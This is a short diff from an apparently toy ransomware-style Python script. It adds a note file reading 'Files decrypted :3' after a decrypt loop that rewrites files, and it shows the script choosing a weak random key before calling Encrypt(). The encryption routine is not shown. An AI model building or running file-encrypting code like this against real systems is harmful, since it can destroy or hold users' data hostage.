@@ -36,6 +36,8 @@ def Decrypt():
                             fw.write(decodedstr)
                 except (PermissionError, IsADirectoryError):
                     pass
+    with open('yay.txt', 'w+') as note:
+        note.write('Files decrypted :3')
 
 key = random.randint(0, 5)
 Encrypt()
